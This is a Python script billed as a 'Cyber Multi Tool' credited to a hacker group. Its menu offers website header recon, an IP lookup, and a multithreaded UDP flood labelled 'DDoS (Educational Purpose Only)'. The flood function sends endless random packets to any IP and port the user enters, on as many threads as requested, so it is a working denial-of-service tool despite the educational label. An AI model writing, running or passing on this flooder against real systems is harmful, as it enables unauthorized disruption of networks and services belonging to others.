import os
import requests
from bs4 import BeautifulSoup
import socket
import threading

def banner():
    os.system("clear" if os.name == "posix" else "cls")
    print("="*55)
    print("           CYBER MULTI TOOL - v1.0")
    print("   Developed by: Muhammad Shourov (Vampire)")
    print("         Team: Vampire Squad")
    print(" GitHub: https://github.com/vampiresquad")
    print("="*55)

def info_gathering():
    site = input("Enter website URL (without https://): ").replace("http://", "").replace("https://", "").strip()
    url = f"https://{site}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    }
    try:
        res = requests.get(url, headers=headers, timeout=10)
        soup = BeautifulSoup(res.text, 'html.parser')
        print("\n[+] Gathering Information...\n")
        print(f"[+] Website Title     : {soup.title.string if soup.title else 'N/A'}")
        print(f"[+] Server Header     : {res.headers.get('Server', 'N/A')}")
        print(f"[+] X-Powered-By      : {res.headers.get('X-Powered-By', 'N/A')}")
        print(f"[+] Status Code       : {res.status_code}")
    except Exception as e:
        print(f"[!] Error: {e}")
    input("\nPress Enter to return to menu...")

def ip_tracker():
    host = input("Enter hostname or website URL: ").replace("http://", "").replace("https://", "").strip()
    try:
        ip = socket.gethostbyname(host)
        print(f"\n[+] IP Address of {host}: {ip}")
    except Exception as e:
        print(f"[!] Error: {e}")
    input("\nPress Enter to return to menu...")

def ddos_attack():
    ip = input("Enter target IP: ").strip()
    try:
        port = int(input("Enter target port: "))
        threads = int(input("Number of threads: "))
    except ValueError:
        print("[!] Invalid port or thread number!")
        return

    def attack():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes_data = os.urandom(1024)
        while True:
            try:
                s.sendto(bytes_data, (ip, port))
                print(f"[+] Sent packet to {ip}:{port}")
            except Exception as e:
                print(f"[!] Error: {e}")
                break

    print("\n[!] Starting attack... Press CTRL+C to stop.")
    for i in range(threads):
        thread = threading.Thread(target=attack)
        thread.start()

def main():
    while True:
        banner()
        print("\n1. Info Gathering")
        print("2. IP Tracker")
        print("3. DDoS (Educational Purpose Only)")
        print("4. Exit\n")

        choice = input("Enter your choice: ")
        if choice == "1":
            info_gathering()
        elif choice == "2":
            ip_tracker()
        elif choice == "3":
            ddos_attack()
        elif choice == "4":
            break
        else:
            print("\n[!] Invalid choice! Try again.")
            input("\nPress Enter to return to menu...")

if __name__ == "__main__":
    main()
